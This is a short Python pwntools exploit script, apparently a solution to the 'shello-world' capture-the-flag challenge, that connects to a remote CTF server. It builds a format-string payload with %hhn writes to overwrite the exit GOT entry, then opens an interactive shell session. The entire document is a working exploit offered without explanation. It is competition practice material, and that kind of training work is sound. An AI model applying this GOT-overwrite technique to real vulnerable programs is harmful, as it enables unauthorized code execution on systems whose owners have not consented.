#!/usr/bin/env python3

from pwn import *

exe = ELF("./shello-world_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challs.tfcctf.com", 30267)

    return r


def main():
    r = conn()
    exit_got = 0x404028
    # good luck pwning :)
    payload = f'%{0x76}c%9$hhn'.encode()
    payload += f'%{0x11-0x76+0x100}c%10$hhn'.encode()
    payload = payload.ljust(24,b"L")
    payload += p64(exit_got)
    payload += p64(exit_got+1)
    
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
